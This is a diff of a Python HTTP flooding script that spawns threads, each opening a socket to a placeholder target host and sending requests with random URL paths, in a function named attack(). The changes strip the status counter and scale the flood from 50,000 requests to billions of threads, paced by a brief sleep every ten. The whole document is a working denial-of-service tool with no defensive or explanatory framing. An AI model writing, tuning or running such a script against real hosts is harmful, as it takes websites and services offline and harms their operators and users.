@@ -1,23 +1,15 @@
-
 import random,socket,string,sys,threading,time
 host = 'destination_host'
 ip = 'destination_ip'
 port = 666
-num_requests = 50000
+x=0
+num_requests = 5000000
 try:
     host = str(host.replace('https://', '').replace('http://', '').replace('www.', ''))
     #ip = socket.gethostbyname(host)
 except socket.gaierror:
     print (' ERROR\n Make sure you entered a correct website')
     quit()
-thread_num = 0
-thread_num_mutex = threading.Lock()
-
-def print_status():
-    global thread_num
-    thread_num_mutex.acquire(True)
-    thread_num += 1
-    thread_num_mutex.release()
 
 def generate_url_path():
     msg = str(string.ascii_letters + string.digits + string.punctuation)
@@ -25,7 +17,6 @@ def generate_url_path():
     return data
 
 def attack():
-    print_status()
     url_path = generate_url_path()
     dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
@@ -40,7 +31,11 @@ def attack():
         dos.close()
 
 all_threads = []
-for i in range(num_requests):
+for i in range(num_requests*100000):
     t1 = threading.Thread(target=attack)
     t1.start()
-    all_threads.append(t1)
+    x=x+1
+    if x%10==0:
+        time.sleep(0.04)
+
+
